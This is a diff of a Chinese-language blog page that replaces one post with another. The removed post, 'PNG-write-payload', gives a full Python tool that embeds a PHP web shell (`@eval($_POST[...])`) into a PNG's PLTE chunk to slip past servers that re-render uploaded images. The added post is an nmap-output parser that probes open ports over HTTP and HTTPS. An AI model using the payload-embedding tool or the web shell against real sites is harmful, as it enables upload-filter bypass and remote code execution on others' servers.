@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PNG-write-payload | Rock&#39;s blog</title>
-  <meta name="keywords" content=" image , png , python , code ">
-  <meta name="description" content="PNG-write-payload | Rock&#39;s blog">
+  <title>nmap-auto-test | Rock&#39;s blog</title>
+  <meta name="keywords" content=" python , nmap ">
+  <meta name="description" content="nmap-auto-test | Rock&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="1.low 通过python提取图像的最低有效位组合成图像，发现是二维码。   from PIL import Image  img = Image.open(&amp;quot;&#x2F;root&#x2F;Downloads&#x2F;low.bmp&amp;quot;) lsbImg = img.copy() pix = lsbImg.load()  width = img.width height = img.height  for">
 <meta name="keywords" content="ctf,writeup,xctf,misc">
@@ -332,9 +332,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-PNG-write-payload" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-nmap" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">PNG-write-payload</h1>
+        <h1 class="article-title">nmap-auto-test</h1>
     
     <div class="article-meta">
         
@@ -343,20 +343,16 @@
         
         <span class="tag">
             
-            <a class="color1">image</a>
-            
-            <a class="color4">png</a>
-            
             <a class="color2">python</a>
             
-            <a class="color5">code</a>
+            <a class="color5">nmap</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-04 19:18:58'>2020-01-04 18:31</time>
+        创建时间:<time class="date" title='更新时间: 2020-05-28 20:13:52'>2020-05-28 20:13</time>
         
     </div>
     <div class="article-meta">
@@ -378,7 +374,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#在PNG图像中隐藏payload，绕过二次渲染"><span class="toc-text">在PNG图像中隐藏payload，绕过二次渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-绕过原理"><span class="toc-text">1.绕过原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。"><span class="toc-text">在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。"><span class="toc-text">对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-程序实现"><span class="toc-text">2.程序实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。"><span class="toc-text">以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用方法："><span class="toc-text">使用方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#示例："><span class="toc-text">示例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#具体实现代码："><span class="toc-text">具体实现代码：</span></a></li></ol></li></ol></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -394,73 +390,51 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="在PNG图像中隐藏payload，绕过二次渲染"><a href="#在PNG图像中隐藏payload，绕过二次渲染" class="headerlink" title="在PNG图像中隐藏payload，绕过二次渲染"></a>在PNG图像中隐藏payload，绕过二次渲染</h1><h2 id="1-绕过原理"><a href="#1-绕过原理" class="headerlink" title="1.绕过原理"></a>1.绕过原理</h2><h3 id="在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。"><a href="#在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。" class="headerlink" title="在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。"></a>在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。</h3><h3 id="对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。"><a href="#对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。" class="headerlink" title="对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。"></a>对于PNG图像，可以考虑把木马隐藏到<code>PLTE</code>数据区或是<code>IDATA</code>数据中。</h3><h2 id="2-程序实现"><a href="#2-程序实现" class="headerlink" title="2.程序实现"></a>2.程序实现</h2><h3 id="以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。"><a href="#以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。" class="headerlink" title="以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。"></a>以下的程序实现了将用户给定payload写入含<code>PLTE</code>数据区的PNG图像中。</h3><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><ul>
-<li>-f 选择要嵌入payload的png图片</li>
-<li>-m PLTE 指定嵌入位置为<code>PLTE</code>数据区</li>
-<li>-p 输入要嵌入的payload,必须使用<code>&quot;</code>包围</li>
+        <p>以下脚本实现了对于nmap端口扫描以-oN保存的扫描结果进行自动web连接尝试的功能。</p>
+<ul>
+<li><p>会自动过滤掉开放超过800个端口以上的ip（可能为蜜罐，或是防火墙设置了特殊的响应规则）</p>
+</li>
+<li><p>连接超时时间设置为5秒</p>
+</li>
+<li><p>对同一个端口同时尝试http和https连接</p>
+<p>  import requests</p>
+<p>  requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)</p>
+<p>  fileList = [“result1.log”, “result2.log”]<br>  basePath = “/root/Downloads/“</p>
+<p>  ipInfoList = []<br>  ipCount = 0<br>  portCount = 0</p>
+</li>
 </ul>
-<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><pre><code>xxx.py -f 1.png -m PLTE -p &quot;&lt;?php @eval($_POST[&apos;id&apos;]);?&gt;&quot;</code></pre><h3 id="具体实现代码："><a href="#具体实现代码：" class="headerlink" title="具体实现代码："></a>具体实现代码：</h3><pre><code>#!/bin/python3
-import binascii
-import re
-import sys, getopt
+<pre><code>for f in fileList:
+    fObj = open(basePath+f, &quot;r&quot;)
+    text = fObj.read()
+    fObj.close()
+    ipInfoList = text.split(&quot;Nmap scan report for &quot;)[1:]
+    if len(ipInfoList) != 0:
+        ipInfoList[len(ipInfoList)-1] = ipInfoList[len(ipInfoList)-1].split(&quot;# Nmap done at &quot;)[0]
 
-&apos;&apos;&apos; GET args &apos;&apos;&apos;
-args = sys.argv[1:]
-try:
-    opts, args = getopt.getopt(sys.argv[1:],&apos;f:m:p:&apos;)
-except getopt.GetoptError:
-    print(&quot;Usage: -f file -m PLTE -p \&quot;playload\&quot;&quot;)
-    sys.exit()
-
-file_path = mode = payload = &quot;&quot;
-for opt, argv in opts:
-    if opt == &apos;-f&apos;:
-        file_path = argv
-    elif opt == &apos;-m&apos;:
-        if argv == &apos;PLTE&apos; or argv == &apos;IDAT&apos;:
-            mode = argv
-        else:
-            print(&quot;Mode ERROR!&quot;)
-            sys.exit()
-    elif opt == &apos;-p&apos;:
-        payload = argv
-
-if mode == &apos;PLTE&apos;:
-    &apos;&apos;&apos; PLTE payload &apos;&apos;&apos;
-    hex_payload = binascii.b2a_hex(payload.encode())
-    file_name = file_path.split(&apos;/&apos;)[-1]
-    png = open(file_path,&apos;rb&apos;)
-    image = png.read()
-    png.close()
-    hexstr = binascii.b2a_hex(image)
-
-    searchObj = re.search(&apos;504c5445(.*?)49444154&apos;, hexstr.decode())
-    if searchObj:
-        front_data = image[:searchObj.span()[0]//2]
-        last_data = image[searchObj.span()[1]//2 - 4:]
-        plte = &apos;504c5445&apos; + searchObj.group(1)
-        if len(plte[:-16]) &gt;= len(hex_payload):
-            _new_plte = plte[:8] + hex_payload.decode() + plte[len(hex_payload) + 8:-16]
-
-            &apos;&apos;&apos; new PLTE crc &apos;&apos;&apos;
-            crc = binascii.crc32(binascii.a2b_hex(_new_plte)) &amp; 0xffffffff
-            new_plte = _new_plte + hex(crc)[2:] + plte[-8:]
-            plte_data = binascii.a2b_hex(new_plte)
-            new_image_data = front_data + plte_data + last_data
-
-            &apos;&apos;&apos; new png &apos;&apos;&apos;
-            try:
-                new_png = open(&quot;_&quot;+file_name,&apos;xb&apos;)
-                new_png.write(new_image_data)
-                new_png.close()
-            except IOError:
-                print(&quot;_%s already exists.&quot; % (file_name))
-                sys.exit()
-        else:
-            print(&quot;Playload too long!&quot;)
-            sys.exit()
-    else:
-        print(&quot;Image doesn&apos;t include PLTE.&quot;)</code></pre>
+        for info in ipInfoList:
+            # print(&quot;has requested %d ip %d port&quot; % (ipCount, portCount), end=&quot;\r&quot;)
+            ipCount += 1
+            ip = info.split(&quot;Host is up &quot;)[0].strip()
+            ports = info.split(&quot;SERVICE&quot;)[1].strip()
+            portList = ports.split(&apos;\n&apos;)
+            if len(portList) &lt; 800:
+                for p in portList:
+                    if p.find(&quot;open&quot;) != -1:
+                        portCount += 1
+                        port = p.split(&quot;/&quot;)[0]
+                        print(&quot;Connecting %15s:%-5s\tHas tried %d ip %d port.&quot; % (ip, port, ipCount, portCount), end=&quot;\r&quot;)
+                        try:
+                            req = requests.get(&quot;http://&quot;+ ip + &quot;:&quot; + port, timeout=5)
+                            print(&quot;\n&quot;+ ip+&quot;:&quot;+ port)
+                        except:
+                            try:
+                                req = requests.get(&quot;https://&quot;+ ip + &quot;:&quot; + port, verify=False , timeout=5)
+                                print(&quot;\n&quot;+ ip+&quot;:&quot;+ port)
+                            except Exception as e:
+                                print(end=&apos;&apos;)
+                                # print(e)
+                        # finally:
+                        #     print(&quot;has requested %d ip %d port&quot; % (ipCount, portCount), end=&quot;\r&quot;)</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以邮件至 luo_xiao_hei_718@163.com </span>
     </div>
@@ -469,12 +443,12 @@ if mode == &apos;PLTE&apos;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>PNG-write-payload</p>
+    <p><span class="copy-title">文章标题:</span>nmap-auto-test</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="Rock">Rock</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-01-04, 18:31:01</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-04, 19:18:58</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/01/04/PNG-write-payload/" title="PNG-write-payload">https://rock718.github.io.git/2020/01/04/PNG-write-payload/</a>
+    <p><span class="copy-title">发布时间:</span>2020-05-28, 20:13:52</p>
+    <p><span class="copy-title">最后更新:</span>2020-05-28, 20:13:52</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/05/28/nmap/" title="nmap-auto-test">https://rock718.github.io.git/2020/05/28/nmap/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
